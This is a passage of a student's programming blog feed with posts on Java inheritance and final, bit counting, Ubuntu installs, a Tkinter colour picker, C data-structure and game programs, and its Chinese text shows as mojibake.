}}/*Ê≠§Â§Ñ,TeacherÊòØÁà∂Á±ª,JavaTeacherÂíåDBTeacherÈÉΩÊòØÁªßÊâøTeacher,1.Áà∂Á±ªÁöÑÊúâÂèÇÊûÑÈÄ†ÊñπÊ≥ï,JavaTeacherÂíåDBTeacher‰ªñ‰ª¨ÁöÑÊûÑÈÄ†ÊñπÊ≥ï,superÁà∂Á±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ï.2.Áà∂Á±ª‰∏≠ÁöÑÊñπÊ≥ï,Â≠êÁ±ªÂèØ‰ª•@Override,ÈáçÂÜô,Âè™ÊòØ‰∏∫‰∫ÜË¶ÜÁõñÁà∂Á±ªÁöÑÊñπÊ≥ï,ÂΩìÈáçÂÜôÁöÑÊó∂ÂÄô,ÂøÖÈ°ªË¶Å‰øùËØÅËøîÂõûÂÄºÂíåÂΩ¢ÂèÇÈÉΩ‰∏çËÉΩÊîπÂèò.3.Âú®@OverrideÊñπÊ≥ï‰∏≠,Â¶ÇÊûúÊÉ≥Ë∞ÉÁî®Áà∂Á±ªÁöÑÊñπÊ≥ï,ÂèØ‰ª•,super.ÊñπÊ≥ï*/</code></pre><p><strong>2.finalÂÖ≥ÈîÆÂ≠ó</strong></p><pre><code>public class FinalDemo {    public static void main(String[] args) {        A a=new A();        a.showNumber1();        final A a2=new A();/*Ê≠§Êó∂,finalÁöÑÂê´‰πâÊòØa2ÊòØÊåáÂêëËøô‰∏™new A(),ËÄå‰∏çÂèØ‰ª•ÂÜç‰∏ãÈù¢ÂÜçÈáçÊñ∞a2=new A()*/        /*a2=new A();The final local variable a2 cannot be assigned. It must be blank and not using a compound assignment*/        //finalÁî®Âú®ÂºïÁî®ÂèòÈáè‰∏ä,‰ª£Ë°®Ê≠§ÂºïÁî®ÂèòÈáè,Âè™ËÉΩÂºïÁî®‰∏ÄÂºÄÂßãËØ¥ÂºïÁî®ÁöÑÁöÑÂØπË±°,‰∏≠ÈÄî‰∏çËÉΩÊîπÂèò        a2.number2 = 5;        a2.showNumber2();    }}/*final */class A{    public final int number1 = 1;    public int number2 = 2;    public void showNumber1(){        System.out.println(number1);    }    public final void showNumber2(){//Â≠êÁ±ª‰∏çËÉΩÂØπÁà∂Á±ª‰∏≠ÁöÑfinalÊñπÊ≥ïÈáçÂÜô        System.out.println(number2);    }}class B extends A{//ÂΩìÂØπclass A Áî®final‰øÆÈ•∞Êó∂,Êó†Ê≥ïÁªßÊâø    /*public void showNumber2(){        System.out.println(super.number2);    }*/}/*1.ÂØπÁà∂Á±ªÂèòÈáèÂä†final:public final int number1 = 1;ÂàôËøô‰∏™ÂèòÈáè‰∏çÂèØ‰ª•‰øÆÊîπ2.ÂØπÊñπÊ≥ïÂä†final:public final void showNumber2(){        System.out.println(number2);    }//Êó†Ê≥ïÂ≠êÁ±ªËøõË°å@Override3.ÂØπÂØπË±°Âä†final: final class A{}ÂàôBÊó†Ê≥ïÁªßÊâøA4.final A a2=new A();/*first*///Âú®mainÂáΩÊï∞‰∏≠Âä†Ëøô‰∏™,Âàôa2Âè™ËÉΩÊåáÂêëÂΩìÂâçËøô‰∏™new A()ËÄå‰∏çËÉΩÂÜçÂÜôa2=new A();/*second*//*a2=new A();The final local variable a2 cannot be assigned. It must be blank and not using a compound assignment*/        //finalÁî®Âú®ÂºïÁî®ÂèòÈáè‰∏ä,‰ª£Ë°®Ê≠§ÂºïÁî®ÂèòÈáè,Âè™ËÉΩÂºïÁî®‰∏ÄÂºÄÂßãËØ¥ÂºïÁî®ÁöÑÁöÑÂØπË±°,‰∏≠ÈÄî‰∏çËÉΩÊîπÂèò*/</code></pre><p><strong>3.ObjectÁ±ª</strong></p><pre><code>public class ObjectDemo {    public static void main(String[] args) {        Student stu=new Student(&quot;jack&quot;, 20);        System.out.println(stu.toString());        Student stu2=new Student(&quot;jack&quot;, 20);        System.out.println(stu.equals(stu2));    }}class Student{    private String name;    private int age;    public Student(String name, int age) {        this.name = name;        this.age = age;    }    @Override    public String toString(){        return &quot;name: &quot;+name+&quot; age:&quot;+age;    }    @Override    public int hashCode() {        final int prime = 31;        int result = 1;        result = prime * result + age;        result = prime * result + ((name == null) ? 0 : name.hashCode());        return result;    }    @Override    public boolean equals(Object obj) {        if (this == obj)            return true;        if (obj == null)            return false;        if (this.getClass() != obj.getClass())//ËøîÂõûÁ±ªÂûã,Ê≠§Â§ÑËøîÂõûÁöÑÊòØstudent            return false;        Student other = (Student) obj;        if (this.age != other.age)            return false;        if (this.name == null) {            if (other.name != null)                return false;        } else if (!this.name.equals(other.name))            return false;        return true;    }}/*ÊØè‰∏™Á±ªÈÉΩÈªòËÆ§ÁªßÊâøObject    1.ÈáçÂÜôtoString    ObjectÁ±ªÁöÑtoString()     public String toString() {            return getClass().getName() + &quot;@&quot; +            Integer.toHexString(hashCode());    }//getClass().getName()ÊòØËøîÂõûÁ±ªÂêç           ÂèØ‰ª•ÈáçÂÜôtoString()ÊñπÊ≥ï    @Override    public String toString(){        return &quot;name: &quot;+name+&quot; age:&quot;+age;    }    2.ÈáçÂÜôequalsÊñπÊ≥ï        Object  ‰∏≠equalsÊ∫êÁ†Å    public boolean equals(Object obj) {        return (this == obj);    }     ÈáçÂÜôequalsÊñπÊ≥ï      @Override    public boolean equals(Object obj) {        if (this == obj)            return true;        if (obj == null)            return false;        if (this.getClass() != obj.getClass())//ËøîÂõûÁ±ªÂûã,Ê≠§Â§ÑËøîÂõûÁöÑÊòØstudent            return false;        Student other = (Student) obj;        if (this.age != other.age)            return false;        if (this.name == null) {            if (other.name != null)                return false;        } else if (!this.name.equals(other.name))            return false;        return true;    }*/</code></pre><p><em>Â≠¶‰π†Ëá™ËÅåÂùêÊ†áÁöÑjavaËØæÁ®ã</em></p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> java </tag>
            
            <tag> ÁªßÊâø </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>‰ΩçËøêÁÆó</title>
      <link href="/2016/11/16/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
      <url>/2016/11/16/%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<p><code>int func(x)  {  int countx = 0;  while (x)  {  countx ++;  x = x &amp; (x - 1);  }  return countx;  }</code><br>ÂÅáÂÆöx = 9999<br>Á≠îÊ°àÊòØ8<br>x&amp;(x-1) Ê±ÇÁöÑÊòØ‰∫åËøõÂà∂‰∏≠1ÁöÑ‰∏™Êï∞<br>x|(x+1) Ê±ÇÁöÑÊòØ‰∫åËøõÂà∂‰∏≠0ÁöÑ‰∏™Êï∞</p><p>ÂÖàÊää9999Êç¢Êàê16ËøõÂà∂ÔºåÁÑ∂ÂêéÂú®ËΩ¨Êç¢Êàê‰∫åËøõÂà∂ÔºåÊ±Ç‰∫åËøõÂà∂‰∏≠1‰∏™‰∏™Êï∞„ÄÇ9999 = Ôºà270FÔºâ 16 = Ôºà0010 0111 0000 1111Ôºâ 2<br>ÊÄªÂÖ±8‰∏™1„ÄÇ</p><p>0010011100001111 &amp; 0010011100001110 = 0010011100001110<br>0010011100001110 &amp; 0010011100001101 = 0010011100001100<br>0010011100001100 &amp; 0010011100001011 = 0010011100001000<br>0010011100001000 &amp; 0010011100000111 = 0010011100000000<br>0010011100000000 &amp; 0010011011111111 = 0010011000000000<br>0010011000000000 &amp; 0010010111111111 = 0010010000000000<br>0010010000000000 &amp; 0010001111111111 = 0010000000000000<br>0010000000000000 &amp; 0001111111111111 = 0000000000000000</p><p><a href="http://www.nowcoder.com/questionTerminal/57a149c65e304b839dd302cafd9ef4f0" target="_blank" rel="noopener"> Ê∫êÂú∞ÂùÄ</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Èù¢ËØïÈ¢ò </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu Êü•Áúãjdk-apiÊñáÊ°£</title>
      <link href="/2016/11/07/Ubuntu%20%E6%9F%A5%E7%9C%8Bjdk-api%E6%96%87%E6%A1%A3/"/>
      <url>/2016/11/07/Ubuntu%20%E6%9F%A5%E7%9C%8Bjdk-api%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>ÂÆâË£ÖËΩØ‰ª∂  kchmviewer:</p><pre><code>sudo apt-get install kchmviewer</code></pre><p>‰∏ãËΩΩchmÊñá‰ª∂:<a href="http://download.csdn.net/detail/yw1530/4841951" target="_blank" rel="noopener">http://download.csdn.net/detail/yw1530/4841951</a></p><p>‰∏ãËΩΩÂêéÁÇπÂáªÊñá‰ª∂,ÊèêÂèñÂà∞Ê°åÈù¢,Âπ∂Â∞ÜËØ•Êñá‰ª∂ÈáçÂëΩÂêç‰∏∫jdkapi.chm</p><p>ÁÑ∂ÂêéÂè≥ÂáªÊâìÂºÄÊñπÂºè.ÈÄâÊã©kchmviewer</p><p>Êù•Ëá™‰øÑÁΩóÊñØÁöÑÁà±</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python Tkiinter Ëá™Âà∂Ë∞ÉËâ≤Êùø</title>
      <link href="/2016/11/05/python%20Tkiinter%20%E8%87%AA%E5%88%B6%E8%B0%83%E8%89%B2%E6%9D%BF/"/>
      <url>/2016/11/05/python%20Tkiinter%20%E8%87%AA%E5%88%B6%E8%B0%83%E8%89%B2%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<pre><code>import Tkinter as tkwindow=tk.Tk()def sliderUpdate(something):    red=redSlider.get()    green=greenSlider.get()    blue=blueSlider.get()    colour=&quot;#%02X%02X%02X&quot;%(red,green,blue)    canvas.config(bg=colour)    hexText.delete(0,tk.END)    hexText.insert(0,colour)def buttonClick():    colour=hexText.get()       canvas.config(bg=colour)    redSlider.set(int(colour[1:3],16))    greenSlider.set(int(colour[3:5],16))    blueSlider.set(int(colour[5:7],16))canvas=tk.Canvas(window)redSlider=tk.Scale(window,from_=0,to=255,command=sliderUpdate)greenSlider=tk.Scale(window,from_=0,to=255,command=sliderUpdate)blueSlider=tk.Scale(window,from_=0,to=255,command=sliderUpdate)hexText=tk.Entry(window,text=&quot;#000000&quot;)button=tk.Button(window,text=&quot;Click&quot;,command=buttonClick)redSlider.grid(row=1,column=1)greenSlider.grid(row=1,column=2)blueSlider.grid(row=1,column=3)canvas.grid(row=2,column=1,columnspan=3)hexText.grid(row=3,column=1,columnspan=3)button.grid(row=4,column=1,columnspan=3)window.mainloop()</code></pre><p>Êú¨ÊÆµÁ®ãÂ∫è‰∏≠ÈáçË¶ÅËøêÁî®Âà∞Â¶Ç‰∏ã</p><p>1.Scale.get()</p><p>ÁÑ∂Âêécolour=‚Äù#%02X%02X%02X‚Äù%(red,green,blue)Â∞ÜÊï∞ÂÄºÂÜô‰∏∫Â≠óÁ¨¶‰∏≤</p><p>2.redSlider.set(int(colour[1:3],16))ËøôÂè•ËØù,ÊòØÂ∞Ü‰∏Ä‰∏™16ËøõÂà∂Â≠óÁ¨¶‰∏≤,ËΩ¨Âåñ‰∏∫10ËøõÂà∂ÁöÑÊï∞Â≠ó,ÁÑ∂ÂêéÈÄöËøáScale.set()</p><p>ÊñπÊ≥ï</p><p>3.redSlider.grid(row=1,column=1) gridÊñπÊ≥ï,Êù•ÊúâÁÇπÂÉèhtml‰∏≠tableÁöÑÂ∏ÉÂ±Ä,‰ª•ÂèäcolumnspanË∑®Âàó</p><p>//ÂàöÂú®‰π¶‰∏äÁúãÂà∞‰∏Ä‰∏™Âà∂‰ΩúÈ¢úËâ≤ÈÄâÊã©Âô®,ÁÑ∂ÂêéËá™Â∑±ÂèàÊîπ‰∫Ü‰∏ÄÁÇπ,Ëá™Â∑±ÂÅö‰∏úË•ø,ÊúâÁßç‰∏∞Ë°£Ë∂≥È£üÁöÑÊÑüËßâ</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux(Ubuntu) ÂÆâË£ÖPython 2.7 IDLE</title>
      <link href="/2016/11/05/Linux(Ubuntu)%20%E5%AE%89%E8%A3%85Python%202.7%20IDLE/"/>
      <url>/2016/11/05/Linux(Ubuntu)%20%E5%AE%89%E8%A3%85Python%202.7%20IDLE/</url>
      
        <content type="html"><![CDATA[<pre><code>sudo apt-get update &amp;&amp; sudo apt-get upgrade</code></pre><p>ËæìÂÖ•ÂØÜÁ†Å</p><pre><code>sudo apt-get install idle-python2.7</code></pre><p>Êù•Ëá™‰∏Ä‰∏™Êô¥Â§©ÁöÑÊòüÊúüÂÖ≠Êó©Êô®</p><p>//ËΩ¨ËΩΩËá™„ÄäÈõ∂Âü∫Á°ÄÂ≠¶Python(ÂõæÊñáÁâà)„Äã</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BÊ†ëÂàõÂª∫Â≠¶ÁîüÁÆ°ÁêÜÁ≥ªÁªü</title>
      <link href="/2016/10/20/B%E6%A0%91%E5%88%9B%E5%BB%BA%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2016/10/20/B%E6%A0%91%E5%88%9B%E5%BB%BA%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p><strong>ÂäüËÉΩÂ¶Ç‰∏ã</strong><br>1. Ê∑ªÂä†Â≠¶Áîü<br>2. Âà†Èô§Â≠¶Áîü<br>3. ‰øÆÊîπÂ≠¶Áîü‰ø°ÊÅØ<br>4. Ëé∑ÂæóÂ≠¶Áîü‰ø°ÊÅØ<br>5. Ëé∑ÂæóÊâÄÊúâÂ≠¶Áîü‰ø°ÊÅØ</p><hr><p><strong>BÊ†ëÂàõÂª∫‰ºòÂäø</strong></p><ol><li>Êü•ÊâæÈùûÂ∏∏Âø´<br>2.‰ªª‰Ωï‰∏Ä‰∏™Â≠¶ÁîüÂè™ÈúÄË¶ÅÊü•ËØ¢Âá†Ê≠•ÔºàË≠¨Â¶Ç2ÁöÑ32Ê¨°ÊñπÁöÑÂ≠¶ÁîüÔºåÊØèÊ¨°Âè™ÈúÄË¶Å32Ê¨°ÈÅçÂéÜÔºâ<br><strong>BÊ†ëÁº∫ÁÇπ</strong><br>1.‰∏•ÈáçÊµ™Ë¥πÁ©∫Èó¥ÔºåÊúâÁÇπÁ¨¶ÂêàÂä®ÊÄÅËßÑÂàíÁöÑÔºö <strong>‰ª•Á©∫Èó¥Êç¢Êó∂Èó¥</strong></li></ol><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct stu{    char name[20];}stu;typedef struct Node{    struct Node *pre,*L,*R;    int id;    struct stu *info;}biTree;biTree* init(){    biTree *root=(biTree*)malloc(sizeof(biTree));    root-&gt;pre=NULL;    root-&gt;L=NULL;    root-&gt;R=NULL;    return root;}void binary(int x,int b[]){    int i,j=0,temp,count=0;    memset(b,0,32*sizeof(int));    if(x==0){        b[0]=0;    }    while(x!=0){        b[count]=x%2;        x/=2;        count++;        }    i=31;    while(j&lt;=i){        temp=b[i];b[i]=b[j];b[j]=temp;        i--;j++;    }}void creat(biTree *root,int id){    biTree *bt,*pre;    int b[32];    bt=root;    binary(id,b);    for (int i = 0; i &lt; 32; ++i){        if(b[i]==0){            if(bt-&gt;L!=NULL){                bt=bt-&gt;L;            }else{                pre=bt;                         bt=(biTree*)malloc(sizeof(biTree));                pre-&gt;L=bt;                bt-&gt;pre=pre;                bt-&gt;L=NULL;                bt-&gt;R=NULL;            }        }else if(b[i]==1){            if(bt-&gt;R!=NULL){                bt=bt-&gt;R;            }else{                pre=bt;                bt=(biTree*)malloc(sizeof(biTree));                pre-&gt;R=bt;                bt-&gt;pre=pre;                bt-&gt;L=NULL;                bt-&gt;R=NULL;            }        }    }    bt-&gt;id=id;    bt-&gt;info=(stu*)malloc(sizeof(stu));    printf(&quot;\n\t\t\tplease input the name:&quot;);    scanf(&quot;%s&quot;,bt-&gt;info-&gt;name);}biTree* getnode(biTree *root,int id){    int b[32];    biTree *bt=root;    binary(id,b);    if(bt==NULL){        return NULL;    }    for (int i = 0; i &lt; 32; ++i){        if(bt==NULL){            return NULL;        }        if(b[i]==0){            bt=bt-&gt;L;            if(bt==NULL){                return NULL;            }        }else if(b[i]==1){            bt=bt-&gt;R;            if(bt==NULL){                return NULL;            }        }    }    return bt;}int main(){    biTree *root;    biTree *stu,*pre;     int code,studentId,i,b[32];     int a[1000];    char name[20];    memset(a,0,sizeof(a));    root=init();    while(1){        printf(&quot;\n\t\t\t==============student system===============&quot;);        printf(&quot;\n\t\t\t             1.add student&quot;);        printf(&quot;\n\t\t\t             2.del student&quot;);               printf(&quot;\n\t\t\t             3.modify student&quot;);        printf(&quot;\n\t\t\t             4.get student information&quot;);        printf(&quot;\n\t\t\t             5.get all student information&quot;);        printf(&quot;\n\t\t\tplease input the choice:&quot;);        scanf(&quot;%d&quot;,&amp;code);        switch(code){            case 1:                printf(&quot;\n\t\t\tplease input studentId you want to add:&quot;);                scanf(&quot;%d&quot;,&amp;studentId);                if(a[studentId]==0){                    a[studentId]=1;                    creat(root,studentId);                    printf(&quot;\n\t\t\tadd success&quot;);                    break;                }                else if(a[studentId]==1){                    printf(&quot;\n\t\t\tthe student is already exit!&quot;);                    break;                }                break;                          case 2:                printf(&quot;\n\t\t\tplease input the studentId you want del:&quot;);                scanf(&quot;%d&quot;,&amp;studentId);                binary(studentId,b);                stu=getnode(root,studentId);                if(stu==NULL){                    printf(&quot;\n\t\t\tthe student don&apos;t exit&quot;);                    break;                }                pre=stu-&gt;pre;                if(b[31]==0){                    pre-&gt;L=NULL;                }else{                    pre-&gt;R=NULL;                }                free(stu);                a[studentId]=0;                printf(&quot;\n\t\t\tdel success&quot;);                break;            case 3:                printf(&quot;\n\t\t\tplease input the studentId you want modify:&quot;);                scanf(&quot;%d&quot;,&amp;studentId);                stu=getnode(root,studentId);                if(stu==NULL){                    printf(&quot;\n\t\t\tthe student don&apos;t exit&quot;);                    break;                }                printf(&quot;\n\t\t\tid: %d,name: %s&quot;,stu-&gt;id,stu-&gt;info-&gt;name);                printf(&quot;\n\t\t\tplease input the new name:&quot;);                scanf(&quot;%s&quot;,stu-&gt;info-&gt;name);                printf(&quot;\n\t\t\tmodify success!&quot;);                break;            case 4:                printf(&quot;\n\t\t\tplease input the studentId you want search:&quot;);                scanf(&quot;%d&quot;,&amp;studentId);                stu=getnode(root,studentId);                if(stu==NULL){                    printf(&quot;\n\t\t\tthe student don&apos;t exit!&quot;);                    break;                }                printf(&quot;\n\t\t\tid: %d,name: %s&quot;,stu-&gt;id,stu-&gt;info-&gt;name);                break;            case 5:            for(int i=0;i&lt;1000;i++){                if(a[i]!=0){                    stu=getnode(root,i);                    printf(&quot;\n\t\t\tid: %d ,name: %s&quot;,stu-&gt;id,stu-&gt;info-&gt;name);                }            }            break;        }    }    return 0;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ÂÆûËÆ≠ </tag>
            
            <tag> Â≠¶ÁîüÁÆ°ÁêÜÁ≥ªÁªü </tag>
            
            <tag> BÊ†ë </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÁÇÆÂºπÊã¶Êà™</title>
      <link href="/2016/10/12/%E7%82%AE%E5%BC%B9%E6%8B%A6%E6%88%AA/"/>
      <url>/2016/10/12/%E7%82%AE%E5%BC%B9%E6%8B%A6%E6%88%AA/</url>
      
        <content type="html"><![CDATA[<pre><code>#include &lt;stdio.h&gt;int main(){    int N,m;    int i,j,preMax,maxNum;    int fire[20];    int test[20];    scanf(&quot;%d&quot;,&amp;N);    while(N--){        scanf(&quot;%d&quot;,&amp;m);        for(i=0;i&lt;m;i++){            scanf(&quot;%d&quot;,&amp;fire[i]);            test[i]=1;            preMax=0;            for(j=0;j&lt;i;j++){                if(fire[j]&gt;fire[i])                    preMax=(preMax&gt;test[j]?preMax:test[j]);                         }            test[i]=preMax+test[i];        }        maxNum=1;        for(i=0;i&lt;m;i++)            if(maxNum&lt;test[i])                maxNum=test[i];        printf(&quot;%d\n&quot;,maxNum);    }    return 0;}</code></pre><ul><li>ÁÆÄÂçïÁöÑÂä®ÊÄÅËßÑÂàí </li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ë¥™ÂêÉËõáÂ§ß‰ΩúÊàò</title>
      <link href="/2016/09/27/%E8%B4%AA%E5%90%83%E8%9B%87%E5%A4%A7%E4%BD%9C%E6%88%98/"/>
      <url>/2016/09/27/%E8%B4%AA%E5%90%83%E8%9B%87%E5%A4%A7%E4%BD%9C%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p>ÂÜô‰∫ÜÂ§ßÊ¶ÇÊúâ‰∏Ä‰∏™ÊòüÊúüÁöÑË¥™ÂêÉËõáÔºåÊúÄÂêéÂ¥©Áõò‰∫ÜÔºåÊ≤°ÊúâÂÜôÊàêÂäü<br>‰πüËÆ∏ÊòØ‰∏™ÈîôËØØÁöÑÊûÑÊÄùÔºåÁî®ÁöÑ‰∫åÁª¥intÊï∞ÁªÑÂÅöÁöÑÔºåÂÜôÂà∞ÊúÄÂêé‰∏ÄÊ≠•ÁöÑÊó∂ÂÄôÔºåÂ∑≤ÁªèÂÆûÁé∞ÁöÑÂäüËÉΩÊòØÂú®ËõáÂ±èÂπï‰∏äÁßªÂä®ÔºåËøòÊúâÂà§Êñ≠game over ÔºåËøòÊúâÈöèÊú∫‰∫ßÁîüÊûúÂÆû</p><hr><p>Âú®ÂÜôË¥™ÂêÉËõáÁöÑËøáÁ®ã‰∏≠ÔºåÂ≠¶Âà∞‰∫Ü‰∏çÂ∞ëÔºå</p><ul><li>kbhitÔºàÔºâÂà§Êñ≠ÊòØÂê¶ÊúâÈîÆÂÖ•ÔºåÊ≤°ÊúâËøîÂõû0Ôºåelse return Èùû0Ôºõ #include </li></ul><pre><code>#include&lt;stdio.h&gt;#include&lt;conio.h&gt;#include&lt;stdlib.h&gt;int main(void){char ch;while(ch!=27){printf(&quot;HelloWorld\n&quot;);if(kbhit())ch=getch();}printf(&quot;End!\n&quot;);system(&quot;pause&quot;);return 0;}</code></pre><ul><li><p>getch()ÂíågetcharÔºà)ÊòØÊúâÂå∫Âà´ÁöÑ<br>getchar();ÈúÄË¶ÅenterÈîÆÔºå<br>getch();Âπ∂‰∏çÈúÄË¶Å</p></li><li><p>ÈöèÊú∫ </p></li></ul><pre><code>#include &lt;time.h&gt;time_t t;srand((unsigned)time(&amp;t));int randomNum=rand()%k+1;</code></pre><ul><li>Ë¥™ÂêÉËõáÂú∞Âõæ </li></ul><pre><code>#include &lt;stdio.h&gt;#include &lt;conio.h&gt;#include &lt;windows.h&gt;int main(){    int width = 30, height = width;  //ÂÆΩÂ∫¶ÂíåÈ´òÂ∫¶    int x, y;  //x„ÄÅyÂàÜÂà´Ë°®Á§∫ÂΩìÂâçË°åÂíåÂàó    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);    //ËÆæÁΩÆÁ™óÂè£Â§ßÂ∞è    system(&quot;mode con: cols=64 lines=32&quot;);    //ÊâìÂç∞ËÉåÊôØÔºåÊåâË°åËæìÂá∫    for(x=0; x&lt;width; x++){        for(y=0; y&lt;height; y++){            if(y==0 || y==width-1 || x==0 || x==height-1){  //ËæìÂá∫ËæπÊ°Ü                SetConsoleTextAttribute(hConsole, 4 );                printf(&quot;‚ñ°&quot;);            }else{  //Ë¥™ÂêÉËõáÊ¥ªÂä®Âå∫Âüü                SetConsoleTextAttribute(hConsole, 2 );                printf(&quot;‚ñ†&quot;);            }        }        printf(&quot;\n&quot;);    }    //ÊöÇÂÅú    getch();    return 0;}//http://c.biancheng.net/cpp/html/2942.html</code></pre><p>‰∏ãÊ¨°ÂÜçÂºÄËΩ¶</p>]]></content>
      
      
      
        <tags>
            
            <tag> Ê∏∏Êàè </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÊäïÂÖ•linuxÊÄÄÊä±ÔºåÊãúÊãúwin</title>
      <link href="/2016/09/15/%E6%8A%95%E5%85%A5linux%E6%80%80%E6%8A%B1%EF%BC%8C%E6%8B%9C%E6%8B%9Cwin/"/>
      <url>/2016/09/15/%E6%8A%95%E5%85%A5linux%E6%80%80%E6%8A%B1%EF%BC%8C%E6%8B%9C%E6%8B%9Cwin/</url>
      
        <content type="html"><![CDATA[<p>Êò®Â§©‰∏ãÂçàË£Ö‰∫Üubuntu16.04ÔºåÁâπÂà´Â•ΩÁé©ÔºåÂõæÂÉèÁïåÈù¢ÂæàËµûÂì¶Ôºå</p><p>Áé∞Âú®Ë∫´Ëæπ3‰∫∫Âú®Áî®linuxÁöÑÔºå</p><p>ÊúÄÂ§ßÁöÑÊÑüËßâÂ∞±ÊòØÔºåeclipseËøêË°åÂ•ΩÂø´ÔºåÂìàÂìà</p><p>‰∏ã‰∫ÜSublime Text3ÔºåÊúÄÁà±ÁöÑÊñáÊú¨ÁºñËæëÂô®ÔºåmonokaiÁöÑÈÖçËâ≤ÊúÄÁà±</p><p>ËøòÊúâÁΩëÊòì‰∫ëÈü≥‰πêÔºåÊúâlinuxÁâàÊú¨ÁöÑ</p><p>ÊêúÁãófor linux</p><p>‰ª•Ââç‰π†ÊÉØÁî®chromeÊµèËßàÂô®ÔºåÁé∞Âú®Âè™ËÉΩÁî®‰ªñÁöÑchromiumÊµèËßàÂô®ÔºåËøò‰∏çÈîôÂá†‰πé‰∏ÄÊ†∑</p><p>firefox‰πü‰∏çÈîô</p><p>ÊúÄÂ•ΩÁé©ÁöÑÂ∞±ÊòØÁî®Ôºåqq2012ÂõΩÈôÖÁâàÁöÑÔºåÊÑüËßâÂõûÂà∞‰∫ÜÂá†ÂçÅÂπ¥Ââç</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>‰∫îÂ≠êÊ£ã</title>
      <link href="/2016/09/13/%E4%BA%94%E5%AD%90%E6%A3%8B/"/>
      <url>/2016/09/13/%E4%BA%94%E5%AD%90%E6%A3%8B/</url>
      
        <content type="html"><![CDATA[<p>ËÄóÊó∂4Â∞èÊó∂ÂÜôÊàê</p><p>‰πãÂâçÔºåÂØπ‰∫éËøô‰∏™‰∫îÂ≠êÊ£ãËøôÁßçÔºåÂú®ÊàëÁúãÊù•ÊòØ‰∏ÄÁßçÊØîËæÉÁÆÄÂçïÊ∏∏ÊàèÔºå‰ΩÜÊòØÔºåÂ¶Ç‰ΩïÊòæÁ§∫ÔºåÊàëËßÅËøáÁöÑ‰∫îÂ≠êÊ£ãÔºåÂ∞±ÊòØqqÊ∏∏ÊàèÈáåÈù¢ÁöÑ‰∫îÂ≠êÊ£ã</p><p>ÂêéÊù•ÔºåÁúãÂà∞‰π¶‰∏äÂõõÂ≠êËøûÈ¢òÁõÆÂÜô‰∫ÜÔºå ** ËøôÂè•ËØùÔºåÂΩìÊîæ‰∏ã‰∏ÄÈ¢óÂ≠êÊó∂ÔºåÁ®ãÂ∫èÂú®ÊéßÂà∂Âè∞ÈáçÊñ∞ÊòæÁ§∫ËØ•Ê£ãÁõòÔºå<br>Ëµ∑Âàù‰ª•‰∏∫system(‚Äúcls‚Äù);‰πãÂêéÊâìÂç∞Ê£ãÁõòÔºå‰ºöÈÄ†ÊàêÂ±èÂπï‰∏äÂ≠òÂú®ËßÜËßâÂÅúÁïôÔºåÂÖ∂ÂÆûÂπ∂Ê≤°Êúâ **</p><hr><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#define MAX 10int a[MAX][MAX];int isOut(int i,int j)//ÊòØÂê¶Ë∂äÁïå{    if(i&lt;0||i&gt;9||j&lt;0||j&gt;9)        return 0;//out    return 1;//in}void print()//Â∫îÁî®‰∫éÊâìÂç∞Ê£ãÁõò{    int i,j;    printf(&quot;p1Áé©ÂÆ∂%c\n&quot;,1);    printf(&quot;p2Áé©ÂÆ∂%c\n&quot;,2);    printf(&quot;  &quot;);    for(i=0;i&lt;10;i++)        printf(&quot;%d &quot;,i);    printf(&quot;\n&quot;);    for(i=0;i&lt;10;i++)    {        printf(&quot;%d &quot;,i);        for(j=0;j&lt;10;j++)            if(a[i][j]==0)                printf(&quot;. &quot;);            else if(a[i][j]==1)                printf(&quot;%c &quot;,1);            else                printf(&quot;%c &quot;,2);        printf(&quot;\n&quot;);    }}void testRight(int i,int j,int flag){    int m,n,sum,row,col;    for(m=i-4,n=j-4;m&lt;=i,n&lt;=j;m++,n++)    {        sum=0;        if(isOut(m,n)==0)            continue;        for(row=m,col=n;sum&lt;=5;row++,col++)            if(a[row][col]!=flag)                break;            else                sum++;        if(sum==5)        {            printf(&quot;%cp%d success\n&quot;,flag,flag);            exit(1);        }    }}void testUpToDown(int i,int j,int flag){    int m,sum,row;    for(m=i-4;m&lt;=i;m++)    {        sum=0;        if(isOut(m,j)==0)            continue;        for(row=m;sum&lt;=5;row++)            if(a[row][j]!=flag)                break;            else                sum++;        if(sum==5)        {            printf(&quot;%cp%d success\n&quot;,flag,flag);            exit(1);        }    }}void testLeft(int i,int j,int flag){    int m,n,sum,row,col;    for(m=i-4,n=j+4;m&lt;=i;m++,n--)    {        sum=0;        if(isOut(m,n)==0)            continue;        for(row=m,col=n;sum&lt;=5;row++,col--)            if(a[row][col]!=flag)                break;            else                sum++;        if(sum==5)        {            printf(&quot;%cp%d success\n&quot;,flag,flag);            exit(1);        }    }}void testLeftToRight(int i,int j,int flag){    int n,sum,col;    for(n=j-4;n&lt;=j;n++)    {        